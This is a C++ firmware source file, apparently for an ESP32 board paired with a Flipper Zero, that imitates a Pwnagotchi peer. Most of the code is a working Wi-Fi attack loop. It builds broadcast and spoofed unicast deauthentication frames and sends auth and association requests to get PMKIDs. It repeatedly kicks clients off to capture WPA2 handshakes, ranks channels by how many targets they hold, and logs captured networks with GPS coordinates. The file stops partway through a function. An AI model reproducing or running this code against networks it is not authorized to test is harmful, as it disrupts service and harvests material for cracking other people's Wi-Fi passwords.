#include "Pwnfriend.h"

#include <LinkedList.h>
#include <ArduinoJson.h>

// The pwngrid signature: every Pwnagotchi beacon is sourced from this MAC, and
// detection is keyed on it. Our friend must use it too.
static const uint8_t PWNGRID_SIG_MAC[6] = {0xde, 0xad, 0xbe, 0xef, 0xde, 0xad};

// Common 2.4 GHz channels to rotate through so we're heard wherever the
// Pwnagotchi is currently hopping.
static const uint8_t HOP_CHANNELS[] = {1, 6, 11, 2, 7, 12, 3, 8, 13, 4, 9, 5, 10};
static const uint8_t NUM_HOP_CHANNELS = sizeof(HOP_CHANNELS) / sizeof(HOP_CHANNELS[0]);

// Face glyphs, indexed to match flipagotchi/include/pwnagotchi.h enum PwnagotchiFace.
static const char* FACE_GLYPHS[] = {
    "",            // 0  NoFace
    "(◕‿‿◕)",     // 1  DefaultFace (Awake)
    "( ⚆_⚆)",     // 2  Look_r
    "(☉_☉ )",     // 3  Look_l
    "( ◕‿◕)",     // 4  Look_r_happy
    "(◕‿◕ )",     // 5  Look_l_happy
    "(⇀‿‿↼)",    // 6  Sleep
    "(≖‿‿≖)",     // 7  Sleep2
    "(◕‿‿◕)",     // 8  Awake
    "(-__-)",      // 9  Bored
    "(°▃▃°)",     // 10 Intense
    "(⌐■_■)",      // 11 Cool
    "(•‿‿•)",     // 12 Happy
    "(^‿‿^)",     // 13 Grateful
    "(ᵔ◡◡ᵔ)",     // 14 Excited
    "(☼‿‿☼)",     // 15 Motivated
    "(≖__≖)",      // 16 Demotivated
    "(✜‿‿✜)",    // 17 Smart
    "(ب__ب)",       // 18 Lonely
    "(╥☁╥ )",     // 19 Sad
    "(-_-')",      // 20 Angry
    "(♥‿‿♥)",     // 21 Friend
    "(☓‿‿☓)",    // 22 Broken
    "(#__#)",      // 23 Debug
    "(1__0)",      // 24 Upload
    "(1__1)",      // 25 Upload1
    "(0__1)",      // 26 Upload2
};
static const int NUM_FACE_GLYPHS = sizeof(FACE_GLYPHS) / sizeof(FACE_GLYPHS[0]);

const char* pwnfriend_face_glyph(int idx) {
    if (idx < 0 || idx >= NUM_FACE_GLYPHS) return FACE_GLYPHS[21];  // default: Friend
    return FACE_GLYPHS[idx];
}

// Copy a sniffed string into `out` keeping only printable, non-quoting chars, so
// a hostile/garbled peer name can't break the single-line PWNFRIEND_PEER framing
// the Flipper reassembles.
static void sanitize(const char* in, char* out, size_t out_sz) {
    size_t j = 0;
    for(size_t i = 0; in && in[i] && j < out_sz - 1; i++) {
        char c = in[i];
        if(c >= 0x20 && c != '"' && c != '\\' && c != 0x7f) out[j++] = c;
    }
    out[j] = '\0';
}

// Format a 6-byte MAC as "aa:bb:cc:dd:ee:ff" into out[18].
static void fmt_mac(char* out, const uint8_t* m) {
    static const char* hex = "0123456789abcdef";
    int j = 0;
    for (int i = 0; i < 6; i++) {
        out[j++] = hex[m[i] >> 4];
        out[j++] = hex[m[i] & 0x0f];
        if (i < 5) out[j++] = ':';
    }
    out[j] = '\0';
}

// Build the geotag JSON suffix `,"lat":LAT,"lon":LON` (decimal-degree floats)
// into `out`, or an empty string when the GPS has no fix — per protocol v2 the
// keys are omitted entirely with no fix. dtostrf (not snprintf %f) so this works
// on cores built with newlib-nano's float-less *printf.
static void fmt_geo(char* out, size_t out_sz, bool has_fix, double lat, double lon) {
    if (!has_fix) { if (out_sz) out[0] = '\0'; return; }
    char latb[16], lonb[16];
    dtostrf(lat, 0, 7, latb);
    dtostrf(lon, 0, 7, lonb);
    snprintf(out, out_sz, ",\"lat\":%s,\"lon\":%s", latb, lonb);
}

// Broadcast deauth: Addr1 = ff.. (all clients), Addr2/Addr3 patched to the BSSID.
static const uint8_t DEAUTH_TEMPLATE[26] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,   // Addr1: broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // Addr2: BSSID (filled)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // Addr3: BSSID (filled)
    0xf0, 0xff, 0x02, 0x00                // seq + reason code 2
};

// Association-request header (28 bytes) modelled on Marauder's association_packet
// (WiFiScan.h) / sendAssociationSleep(): a mgmt assoc-request whose Addr1(dst) and
// Addr3(bssid) are the target AP and Addr2(src) is our station MAC. Followed by the
// SSID / Supported-Rates / RSN IEs appended in assocAP(). PM=1, WPA2 capability.
static const uint8_t ASSOC_TEMPLATE[28] = {
    0x00, 0x10,                           // FC: assoc request, PM=1
    0x3a, 0x01,                           // duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,   // Addr1 dst: target BSSID (filled)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // Addr2 src: our station MAC (filled)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // Addr3 bssid: target BSSID (filled)
    0x00, 0x00,                           // seq-ctl (hw fills)
    0x31, 0x00,                           // capability info (ESS+Privacy+..., PM)
    0x0a, 0x00                            // listen interval
};

// pwnagotchi timing constants (defaults.toml), replicated 1:1 so a handshake we
// force actually lands before we hop. recon_time: sweep all channels this long
// each epoch; hop_recon_time: after deauthing, DWELL this long on the attacked
// channel so the 4-way handshake completes before we move on. (We always deauth
// in active mode, so pwnagotchi's shorter assoc-only min_recon_time never applies.)
static const uint32_t RECON_TIME_MS       = 30000; // personality.recon_time = 30
static const uint32_t HOP_RECON_TIME_MS   = 10000; // personality.hop_recon_time = 10
static const uint32_t RECON_HOP_MS        = 1200;  // sweep cadence during recon
static const uint8_t  MAX_INACTIVE_SCALE  = 2;     // personality.max_inactive_scale
static const uint8_t  RECON_INACTIVE_MULT = 2;     // personality.recon_inactive_multiplier

// Dense-area capture tuning (see doc + the overnight 7/80 analysis).
// Re-kick clients periodically across the dwell: a client reconnects at a random
// offset after the deauth, so one burst at t=0 misses most 4-way replays.
static const uint32_t DEAUTH_REPEAT_MS = 2000;     // deauth pass every 2s while dwelling
// Per-channel dwell scales with the number of attackable APs on it: busy channels
// (1/6/11) earn more airtime, near-empty channels drain fast. clamp[MIN,MAX].
static const uint32_t DWELL_PER_AP_MS = 1500;
static const uint32_t DWELL_MIN_MS    = 4000;
static const uint32_t DWELL_MAX_MS    = 15000;
// Skip APs weaker than this when attacking (their handshake rarely completes) —
// discovery/reporting still logs every AP. -128 disables; overridable with -minrssi.
static const int8_t   DEFAULT_ATTACK_MIN_RSSI = -78;

// Open-system Authentication (30 bytes), sent immediately before the assoc request
// so the AP treats us as an authenticated STA and will emit its EAPOL M1 (which
// carries the RSN PMKID). Without this the assoc-req is a class-2 frame the AP just
// rejects — which is why the overnight run captured essentially no PMKID.
static const uint8_t AUTH_TEMPLATE[30] = {
    0xb0, 0x00,                           // FC: mgmt / authentication
    0x3a, 0x01,                           // duration
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // Addr1 dst: target BSSID (filled)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // Addr2 src: our station MAC (filled)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // Addr3 bssid: target BSSID (filled)
    0x00, 0x00,                           // seq-ctl (hw fills)
    0x00, 0x00,                           // auth algorithm: Open System
    0x01, 0x00,                           // auth transaction seq: 1
    0x00, 0x00                            // status: reserved
};

static bool valid_identity(const char* s) {
    int n = 0;
    for (; s[n]; n++) {
        char c = s[n];
        bool hex = (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F');
        if (!hex) return false;
    }
    return n == 64;
}

// Parse exactly 12 hex chars ("aabbccddeeff") into 6 bytes. False otherwise.
static bool parse_bssid12(const char* s, uint8_t out[6]) {
    int n = 0;
    for (; s[n]; n++) {
        char c = s[n];
        bool hex = (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F');
        if (!hex) return false;
    }
    if (n != 12) return false;
    for (int i = 0; i < 6; i++) {
        char pair[3] = {s[i * 2], s[i * 2 + 1], '\0'};
        out[i] = (uint8_t)strtol(pair, nullptr, 16);
    }
    return true;
}

Pwnfriend::Pwnfriend() {
    reset();
}

void Pwnfriend::reset() {
    strncpy(_name, "flippy", sizeof(_name));
    _name[sizeof(_name) - 1] = '\0';
    // A recognisable but valid (64-hex) default identity; the Flipper normally
    // supplies a stable per-persona one via -id.
    strncpy(_identity, "deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef0",
            sizeof(_identity));
    _identity[sizeof(_identity) - 1] = '\0';
    _face = pwnfriend_face_glyph(21);
    _pwnd_run = 0;
    _pwnd_tot = 0;
    _uptime = 0;
    _epoch = 0;
    _deauth_policy = false;
    // Stable session id (Addr3). Derived from the first bytes of the identity so
    // it stays constant for a given persona but differs between personas.
    for (int i = 0; i < 6; i++) {
        char pair[3] = {_identity[i * 2], _identity[i * 2 + 1], '\0'};
        _session_id[i] = (uint8_t)strtol(pair, nullptr, 16);
    }
    _pinned_channel = -1;
    _hop_idx = 0;
    _frame_len = 0;
    _ready = false;
    _sent = 0;
    _last_active_ms = 0;
    _n_recon = 0;
    _n_pwnd_seen = 0;
    _n_sta = 0;
    _inactive_epochs = 0;
    _epoch_pwnd = false;
    _last_deauth_ms = 0;
    _cur_dwell_ms = HOP_RECON_TIME_MS;
    _attack_min_rssi = DEFAULT_ATTACK_MIN_RSSI;
    _recon_time_ms = RECON_TIME_MS;
    _target_set = false;
    memset(_target, 0, sizeof(_target));
    _n_wl = 0;
    resetPhase();
}

// Back to a fresh RECON sweep from channel-hop index 0. Called at reset and at
// real scan start (beginSession) so a new run always starts by gathering APs.
void Pwnfriend::resetPhase() {
    _phase = PHASE_RECON;
    _phase_ms = millis();
    _last_hop_ms = 0;   // hop on the very first tick
    _hop_idx = 0;       // ...and start that sweep at HOP_CHANNELS[0]
    _cur_channel = HOP_CHANNELS[0];
    _n_attack = 0;
    _attack_idx = 0;
    _chan_attacked = false;
}

// One epoch of the recon loop is over: roll the inactive streak (which slows the
// next recon sweep when nothing's landing, agent.recon()'s recon_time doubling)
// and start a fresh RECON sweep. `_epoch` itself is owned by the Flipper (-e).
void Pwnfriend::endEpoch(uint32_t now) {
    if (_epoch_pwnd) _inactive_epochs = 0;
    else if (_inactive_epochs < 255) _inactive_epochs++;
    _epoch_pwnd = false;
    _phase = PHASE_RECON;
    _phase_ms = now;
    _last_hop_ms = 0;
}

// The channels that actually have APs, most-populated first — agent.py's
// get_access_points_by_channel(): attack the busiest channels first.
void Pwnfriend::buildAttackList() {
    _n_attack = 0;
    uint8_t count[15] = {0};
    for (int i = 0; i < _n_recon; i++) {
        if (!attackable(_recon[i])) continue;   // ignore all-pwned / too-weak channels
        uint8_t c = _recon[i].channel;
        if (c >= 1 && c <= 14) count[c]++;
    }
    for (int c = 1; c <= 14; c++) {
        if (count[c] > 0 && _n_attack < (int)sizeof(_attack_list))
            _attack_list[_n_attack++] = (uint8_t)c;
    }
    // Insertion sort by population, descending (<=14 entries).
    for (int i = 1; i < _n_attack; i++) {
        uint8_t ch = _attack_list[i];
        int j = i - 1;
        while (j >= 0 && count[_attack_list[j]] < count[ch]) {
            _attack_list[j + 1] = _attack_list[j];
            j--;
        }
        _attack_list[j + 1] = ch;
    }
}

// Worth attacking? Not already captured, and in range (RSSI gate; unknown rssi==0
// -> attack anyway). pwnagotchi skips pwned APs (_has_handshake) and drops weak
// ones via wifi.rssi.min.
bool Pwnfriend::attackable(const ReconAP& ap) const {
    if (isPwnd(ap.bssid)) return false;
    if (ap.rssi != 0 && ap.rssi < _attack_min_rssi) return false;
    if (_target_set && memcmp(ap.bssid, _target, 6) != 0) return false;  // focus one AP
    if (isWhitelisted(ap.bssid)) return false;                           // hands off
    return true;
}

bool Pwnfriend::isWhitelisted(const uint8_t* bssid) const {
    for (int i = 0; i < _n_wl; i++)
        if (memcmp(_wl[i], bssid, 6) == 0) return true;
    return false;
}

// How long to camp on a channel: scale with the count of attackable APs on it, so
// the busy channels (1/6/11) get the airtime and near-empty ones drain fast.
uint32_t Pwnfriend::channelDwellMs(uint8_t channel) {
    int targets = 0;
    for (int i = 0; i < _n_recon; i++)
        if (_recon[i].channel == channel && attackable(_recon[i])) targets++;
    uint32_t d = DWELL_PER_AP_MS * (uint32_t)(targets > 0 ? targets : 1);
    if (d < DWELL_MIN_MS) d = DWELL_MIN_MS;
    if (d > DWELL_MAX_MS) d = DWELL_MAX_MS;
    return d;
}

// agent.py's per-AP loop for one channel, on channel entry: associate() (solicit the
// RSN PMKID) + a full deauth pass (broadcast + UNICAST to each known client, which
// is what actually forces a 4-way replay). One "attack" per epoch per AP for the
// miss accounting; the deauth is then re-kicked mid-dwell by deauthChannelPass().
void Pwnfriend::attackChannel(uint8_t channel) {
    for (int i = 0; i < _n_recon; i++) {
        if (_recon[i].channel != channel || !attackable(_recon[i])) continue;
        assocAP(_recon[i].bssid, _recon[i].ssid);  // auth+assoc -> RSN PMKID (M1)
        deauthAP(_recon[i].bssid);                 // broadcast fallback
        for (int s = 0; s < _n_sta; s++)           // unicast each known client
            if (_sta[s].ap_idx == (uint8_t)i)
                deauthClient(_recon[i].bssid, _sta[s].mac);
        if (_recon[i].attacks < 255) _recon[i].attacks++;
        if (!_recon[i].missed && _recon[i].attacks >= MISS_ATTEMPTS &&
            !isPwnd(_recon[i].bssid)) {
            _recon[i].missed = true;
            char mac[18];
            fmt_mac(mac, _recon[i].bssid);
            char line[40];
            int n = snprintf(line, sizeof(line), "PWNFRIEND_MISS %s\n", mac);
            if (n > 0) Serial.write((const uint8_t*)line, (size_t)n);
        }
    }
}

// A deauth-only re-kick (no assoc) fired every DEAUTH_REPEAT_MS during the dwell:
// clients reconnect at random offsets after a deauth, so repeated kicks across the
// window catch far more 4-way handshakes than a single burst at channel entry.
void Pwnfriend::deauthChannelPass(uint8_t channel) {
    for (int i = 0; i < _n_recon; i++) {
        if (_recon[i].channel != channel || !attackable(_recon[i])) continue;
        deauthAP(_recon[i].bssid);
        for (int s = 0; s < _n_sta; s++)
            if (_sta[s].ap_idx == (uint8_t)i)
                deauthClient(_recon[i].bssid, _sta[s].mac);
    }
}

bool Pwnfriend::configureFromArgs(LinkedList<String>* args) {
    // args->get(0) == "pwnfriend"; scan for flags.
    int prev_pinned = _pinned_channel;   // detect an actual channel-tune change below
    bool prev_deauth = _deauth_policy;   // ...and an actual capture-policy change
    bool prev_target_set = _target_set;  // ...target / whitelist / recon changes
    uint8_t prev_target[6]; memcpy(prev_target, _target, 6);
    int prev_n_wl = _n_wl;
    uint8_t prev_wl[MAX_WL][6]; memcpy(prev_wl, _wl, sizeof(_wl));
    uint32_t prev_recon = _recon_time_ms;
    for (int i = 1; i < args->size() - 1; i++) {
        String flag = args->get(i);
        String val = args->get(i + 1);
        if (flag == "-n") {
            // Underscores stand in for spaces on the wire.
            val.replace('_', ' ');
            strncpy(_name, val.c_str(), sizeof(_name));
            _name[sizeof(_name) - 1] = '\0';
        } else if (flag == "-id") {
            if (!valid_identity(val.c_str())) return false;
            strncpy(_identity, val.c_str(), sizeof(_identity));
            _identity[sizeof(_identity) - 1] = '\0';
            for (int b = 0; b < 6; b++) {
                char pair[3] = {_identity[b * 2], _identity[b * 2 + 1], '\0'};
                _session_id[b] = (uint8_t)strtol(pair, nullptr, 16);
            }
        } else if (flag == "-f") {
            _face = pwnfriend_face_glyph(val.toInt());
        } else if (flag == "-pr") {
            _pwnd_run = (uint32_t)val.toInt();
        } else if (flag == "-pt") {
            _pwnd_tot = (uint32_t)val.toInt();
        } else if (flag == "-u") {
            _uptime = (uint32_t)val.toInt();
        } else if (flag == "-e") {
            _epoch = (uint32_t)val.toInt();
        } else if (flag == "-ch") {
            int c = val.toInt();
            _pinned_channel = (c >= 1 && c <= 14) ? c : -1;
        } else if (flag == "-deauth") {
            _deauth_policy = (val == "1" || val == "true");
        } else if (flag == "-minrssi") {
            // Attack-targeting floor in dBm (e.g. -78). -128 disables the gate.
            int r = val.toInt();
            if (r > 0) r = -r;                    // tolerate a positive magnitude
            if (r < -128) r = -128;
            _attack_min_rssi = (int8_t)r;
        } else if (flag == "-recon") {
            int s = val.toInt();
            if (s >= 5 && s <= 600) _recon_time_ms = (uint32_t)s * 1000;
        } else if (flag == "-target") {
            // 12-hex BSSID to focus on; "0"/empty/malformed clears the target.
            uint8_t b[6];
            if (parse_bssid12(val.c_str(), b)) { memcpy(_target, b, 6); _target_set = true; }
            else _target_set = false;
        } else if (flag == "-wl") {
            // Comma-separated 12-hex BSSIDs never to attack. "0"/empty clears.
            _n_wl = 0;
            char buf[MAX_WL * 13 + 8];
            strncpy(buf, val.c_str(), sizeof(buf) - 1);
            buf[sizeof(buf) - 1] = '\0';
            for (char* tok = strtok(buf, ","); tok && _n_wl < MAX_WL; tok = strtok(nullptr, ",")) {
                uint8_t b[6];
                if (parse_bssid12(tok, b)) memcpy(_wl[_n_wl++], b, 6);
            }
        }
    }
    // NB: the dedup tables (_n_recon/_n_pwnd_seen) are deliberately NOT cleared
    // here. The Flipper re-sends this command every ~15s to refresh the persona;
    // clearing on each refresh would re-count already-pwnd APs and inflate
    // pwnd_tot without bound. They are cleared once, at real scan start, in
    // WiFiScan::RunPwnfriendScan -> beginSession().
    // A genuine channel tune/un-tune, capture-policy flip, or a target/whitelist/recon
    // change restarts the recon sweep so we don't keep running a stale attack plan (in
    // particular, turning deauth OFF mid-attack, or re-targeting, must take effect at
    // once). The 15s same-value resend changes none of these, so it's left untouched.
    bool cfg_changed = (_pinned_channel != prev_pinned) || (_deauth_policy != prev_deauth) ||
                       (_target_set != prev_target_set) ||
                       (_target_set && memcmp(_target, prev_target, 6) != 0) ||
                       (_n_wl != prev_n_wl) || memcmp(_wl, prev_wl, sizeof(_wl)) != 0 ||
                       (_recon_time_ms != prev_recon);
    if (cfg_changed) resetPhase();
    rebuild();
    _ready = true;
    return true;
}

void Pwnfriend::buildJson(char* out, size_t out_len) {
    // Kept deliberately compact so the whole advertisement fits in ONE vendor IE
    // (<=255 bytes). pwngrid can split a bigger payload across chunks, but
    // Marauder's sniffpwn scans a single contiguous {..} region, so a split
    // payload would break detection. Every field here is one a receiver actually
    // reads: pwngrid needs `identity`; the Pwnagotchi renders name/face/pwnd_*;
    // Marauder reads name/pwnd_tot/version/uptime/policy.deauth. The session id
    // is intentionally omitted — pwngrid takes it from the frame's Addr3, not
    // the JSON. Bounded inputs (name<=16, identity=64) keep this ~210 bytes.
    snprintf(out, out_len,
             "{\"name\":\"%s\",\"identity\":\"%s\",\"version\":\"1.0.0\","
             "\"face\":\"%s\",\"pwnd_run\":%u,\"pwnd_tot\":%u,\"uptime\":%u,"
             "\"policy\":{\"deauth\":%s}}",
             _name, _identity, _face,
             (unsigned)_pwnd_run, (unsigned)_pwnd_tot, (unsigned)_uptime,
             _deauth_policy ? "true" : "false");
}

void Pwnfriend::rebuild() {
    // 802.11 beacon header (38 bytes) then vendor IE 222 with the JSON payload.
    static const uint8_t HEADER[38] = {
        0x80, 0x00,                          // frame control: mgmt / beacon
        0x00, 0x00,                          // duration
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  // Addr1 dst: broadcast
        0xde, 0xad, 0xbe, 0xef, 0xde, 0xad,  // Addr2 src: pwngrid signature
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Addr3 bssid: session id (patched below)
        0x00, 0x00,                          // seq-ctl (hw fills)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // timestamp (hw fills)
        0x64, 0x00,                          // beacon interval: 100 TU
        0x00, 0x00,                          // capability info
    };

    char json[240];
    buildJson(json, sizeof(json));
    int jlen = strlen(json);
    if (jlen > 255) jlen = 255;  // single IE cap; personas are far smaller

    memcpy(_frame, HEADER, sizeof(HEADER));
    memcpy(_frame + 16, _session_id, 6);  // Addr3
    _frame[36] = 0xDE;                     // IE id 222 (IDWhisperPayload)
    _frame[37] = (uint8_t)jlen;            // IE length
    memcpy(_frame + 38, json, jlen);
    _frame_len = 38 + jlen;
}

void Pwnfriend::broadcast() {
    if (!_ready) return;

    uint32_t now = millis();

    // --- run the recon/attack epoch machine to pick the channel we park on ---
    if (_pinned_channel > 0) {
        // User tuned to a fixed channel (arrow-select on the Flipper): camp on it,
        // always listen, and in active mode re-attack it once per dwell window.
        // agent.py with personality.channels = [ch].
        _cur_channel = (uint8_t)_pinned_channel;
        if (_deauth_policy && now - _last_active_ms >= HOP_RECON_TIME_MS) {
            _last_active_ms = now;
            attackChannel(_cur_channel);
        }
    } else if (_phase == PHASE_RECON) {
        // Sweep every channel, gathering APs (rx callback) and being heard by the
        // pwnagotchi. recon_time doubles while inactive (agent.recon()).
        if (now - _last_hop_ms >= RECON_HOP_MS) {
            _last_hop_ms = now;
            _cur_channel = HOP_CHANNELS[_hop_idx];
            _hop_idx = (_hop_idx + 1) % NUM_HOP_CHANNELS;
        }
        uint32_t recon_ms = _recon_time_ms;
        if (_inactive_epochs >= MAX_INACTIVE_SCALE) recon_ms *= RECON_INACTIVE_MULT;
        if (now - _phase_ms >= recon_ms) {
            if (_deauth_policy) {
                buildAttackList();
                if (_n_attack > 0) {
                    _phase = PHASE_ATTACK;
                    _attack_idx = 0;
                    _chan_attacked = false;
                    _phase_ms = now;
                } else {
                    endEpoch(now);   // nothing worth attacking -> next recon epoch
                }
            } else {
                endEpoch(now);       // passive: perpetual all-channel listen
            }
        }
    } else { // PHASE_ATTACK
        _cur_channel = _attack_list[_attack_idx];
        if (!_chan_attacked) {
            // Just arrived on this channel: associate + deauth every AP here, then
            // DWELL (scaled by how many targets this channel has) so the handshakes
            // we force actually land, re-kicking clients along the way.
            attackChannel(_cur_channel);
            _chan_attacked = true;
            _phase_ms = now;
            _last_deauth_ms = now;
            _cur_dwell_ms = channelDwellMs(_cur_channel);
        } else if (now - _phase_ms >= _cur_dwell_ms) {
            _attack_idx++;
            if (_attack_idx >= _n_attack) {
                endEpoch(now);       // whole channel plan done -> next recon epoch
            } else {
                _chan_attacked = false;  // move to the next AP-bearing channel
            }
        } else if (now - _last_deauth_ms >= DEAUTH_REPEAT_MS) {
            // Still dwelling: re-kick this channel's clients to catch reconnects.
            _last_deauth_ms = now;
            deauthChannelPass(_cur_channel);
        }
    }

    esp_wifi_set_channel(_cur_channel, WIFI_SECOND_CHAN_NONE);
    delay(1);

    // Re-emit the frame so updated stats (uptime, pwnd counts, face) propagate.
    rebuild();

    // A few copies per burst — beacons are cheap and lossy. TX on the AP
    // interface: STA-mode tx did not actually radiate (verified on-air). We keep
    // beaconing even while dwelling so the mesh still hears us on this channel.
    for (int i = 0; i < 3; i++) {
        esp_wifi_80211_tx(WIFI_IF_AP, _frame, _frame_len, false);
        _sent++;
    }

    // One atomic write so this main-loop line can't interleave with the rx
    // callback's PWNFRIEND_* prints.
    char line[96];
    int n = snprintf(line, sizeof(line), "PWNFRIEND_ADV name=%s ch=%u sent=%u\n",
                     _name, (unsigned)_cur_channel, (unsigned)_sent);
    if (n < 0) return;
    if (n >= (int)sizeof(line)) n = sizeof(line) - 1;
    Serial.write((const uint8_t*)line, n);
}

void Pwnfriend::reportPeer(const uint8_t* payload, int length, int rssi, int channel) {
    // Locate the JSON the same way Marauder's processPwnagotchiBeacon does.
    int start = 36, end = length;
    while (start < length && payload[start] != '{') start++;
    while (end > start && payload[end - 1] != '}') end--;
    if (start >= end) return;

    String json = String((char*)payload + start, end - start);

    StaticJsonDocument<2048> doc;
    if (deserializeJson(doc, json)) return;
    if (!doc.containsKey("name")) return;

    const char* name = doc["name"] | "???";
    const char* ident = doc["identity"] | "";
    int pwnd_tot = doc["pwnd_tot"] | 0;
    int pwnd_run = doc["pwnd_run"] | 0;
    long uptime = doc["uptime"] | 0;
    bool deauth = doc["policy"]["deauth"] | false;

    char safe_name[33];
    char safe_ident[65];
    sanitize(name, safe_name, sizeof(safe_name));
    sanitize(ident, safe_ident, sizeof(safe_ident));

    // One structured line the Flipper filters on its PWNFRIEND_ prefix. Built
    // into a single buffer and emitted as ONE write so it can't interleave with
    // broadcast()'s prints running in the main-loop task.
    char line[320];
    int n = snprintf(line, sizeof(line),
        "PWNFRIEND_PEER {\"name\":\"%s\",\"identity\":\"%s\",\"pwnd_tot\":%d,"
        "\"pwnd_run\":%d,\"uptime\":%ld,\"rssi\":%d,\"channel\":%d,\"deauth\":%s}\n",
        safe_name, safe_ident, pwnd_tot, pwnd_run, uptime, rssi, channel,
        deauth ? "true" : "false");
    if (n < 0) return;
    if (n >= (int)sizeof(line)) n = sizeof(line) - 1;
    Serial.write((const uint8_t*)line, n);
}

int Pwnfriend::reconIndex(const uint8_t* bssid) const {
    for (int i = 0; i < _n_recon; i++)
        if (memcmp(_recon[i].bssid, bssid, 6) == 0) return i;
    return -1;
}

bool Pwnfriend::isPwnd(const uint8_t* bssid) const {
    for (int i = 0; i < _n_pwnd_seen; i++)
        if (memcmp(_pwnd_seen[i], bssid, 6) == 0) return true;
    return false;
}

bool Pwnfriend::markPwnd(const uint8_t* bssid) {
    for (int i = 0; i < _n_pwnd_seen; i++)
        if (memcmp(_pwnd_seen[i], bssid, 6) == 0) return false;  // already counted
    if (_n_pwnd_seen >= MAX_PWND) return false;                  // table full: stop
    memcpy(_pwnd_seen[_n_pwnd_seen++], bssid, 6);
    return true;
}

void Pwnfriend::emitPwnd(const uint8_t* bssid, const char* ssid,
                         const char* type, int channel, int rssi,
                         bool has_fix, double lat, double lon) {
    char mac[18];
    fmt_mac(mac, bssid);
    char geo[48];
    fmt_geo(geo, sizeof(geo), has_fix, lat, lon);
    char line[256];
    int n = snprintf(line, sizeof(line),
        "PWNFRIEND_PWND {\"bssid\":\"%s\",\"ssid\":\"%s\",\"type\":\"%s\","
        "\"channel\":%d,\"rssi\":%d%s}\n",
        mac, ssid, type, channel, rssi, geo);
    if (n < 0) return;
    if (n >= (int)sizeof(line)) n = sizeof(line) - 1;
    Serial.write((const uint8_t*)line, n);
}

void Pwnfriend::deauthAP(const uint8_t* bssid) {
    uint8_t f[26];
    memcpy(f, DEAUTH_TEMPLATE, sizeof(f));
    memcpy(f + 10, bssid, 6);   // Addr2 = BSSID
    memcpy(f + 16, bssid, 6);   // Addr3 = BSSID
    for (int i = 0; i < 3; i++)
        esp_wifi_80211_tx(WIFI_IF_AP, f, sizeof(f), false);
}

void Pwnfriend::deauthClient(const uint8_t* bssid, const uint8_t* client) {
    // Spoof BOTH directions — this is what actually kicks a modern client and makes
    // it re-do the 4-way handshake (broadcast deauth is widely ignored). Mirrors
    // Marauder's sendDeauthFrame / bettercap's wifi.deauth.
    uint8_t f[26];
    memcpy(f, DEAUTH_TEMPLATE, sizeof(f));
    memcpy(f + 4, client, 6);   // Addr1 dst = client   (frame appears from the AP)
    memcpy(f + 10, bssid, 6);   // Addr2 src = BSSID
    memcpy(f + 16, bssid, 6);   // Addr3 = BSSID
    for (int i = 0; i < 2; i++)
        esp_wifi_80211_tx(WIFI_IF_AP, f, sizeof(f), false);
    memcpy(f + 4, bssid, 6);    // Addr1 dst = AP        (frame appears from the client)
    memcpy(f + 10, client, 6);  // Addr2 src = client
    memcpy(f + 16, bssid, 6);   // Addr3 = BSSID
    for (int i = 0; i < 2; i++)
        esp_wifi_80211_tx(WIFI_IF_AP, f, sizeof(f), false);
}

void Pwnfriend::assocAP(const uint8_t* bssid, const char* ssid) {
    // Open-system Authentication FIRST, so the AP treats us as an authenticated STA
    // and will answer the association with EAPOL M1 (carrying the RSN PMKID). A bare
    // assoc-req from an un-authenticated STA is a class-2 frame the AP just rejects.
    {
        uint8_t a[30];
        memcpy(a, AUTH_TEMPLATE, sizeof(a));
        memcpy(a + 4, bssid, 6);          // Addr1 dst = target AP
        memcpy(a + 10, _session_id, 6);   // Addr2 src = our station MAC
        memcpy(a + 16, bssid, 6);         // Addr3 bssid = target AP
        for (int i = 0; i < 2; i++)
            esp_wifi_80211_tx(WIFI_IF_AP, a, sizeof(a), false);
        delay(2);                          // let the AP process the auth before assoc
    }

    // header(28) + SSID IE(2+<=32) + Supported Rates IE(6) + RSN IE(22) <= 90.
    uint8_t f[96];
    memcpy(f, ASSOC_TEMPLATE, sizeof(ASSOC_TEMPLATE));
    memcpy(f + 4, bssid, 6);          // Addr1 dst = target AP (unicast)
    memcpy(f + 10, _session_id, 6);   // Addr2 src = our station MAC
    memcpy(f + 16, bssid, 6);         // Addr3 bssid = target AP
    int p = sizeof(ASSOC_TEMPLATE);

    // SSID IE (tag 0) — the AP the assoc is aimed at.
    int slen = ssid ? (int)strlen(ssid) : 0;
    if (slen > 32) slen = 32;
    f[p++] = 0x00;
    f[p++] = (uint8_t)slen;
    memcpy(f + p, ssid, slen); p += slen;

    // Supported Rates IE (1/2/5.5/11 Mbps) — same set Marauder's assoc uses.
    static const uint8_t RATES[6] = {0x01, 0x04, 0x82, 0x04, 0x0b, 0x16};
    memcpy(f + p, RATES, sizeof(RATES)); p += sizeof(RATES);

    // RSN IE (WPA2-PSK / CCMP), verbatim from Marauder's association_packet. This
    // is what makes the AP treat us as an RSN client, so its EAPOL M1 can carry
    // the RSN PMKID that reportHandshake() pulls out (type "pmkid").
    static const uint8_t RSN[22] = {
        0x30, 0x14,                         // RSN tag, len 20
        0x01, 0x00,                         // version
        0x00, 0x0f, 0xac, 0x04,             // group cipher: CCMP
        0x01, 0x00,                         // pairwise count
        0x00, 0x0f, 0xac, 0x04,             // pairwise cipher: CCMP
        0x01, 0x00,                         // AKM count
        0x00, 0x0f, 0xac, 0x02,             // AKM: WPA2-PSK
        0x0c, 0x00                          // RSN capabilities
    };
    memcpy(f + p, RSN, sizeof(RSN)); p += sizeof(RSN);

    // A couple of copies per AP per burst — enough to solicit, not a flood.
    for (int i = 0; i < 2; i++)
        esp_wifi_80211_tx(WIFI_IF_AP, f, p, false);
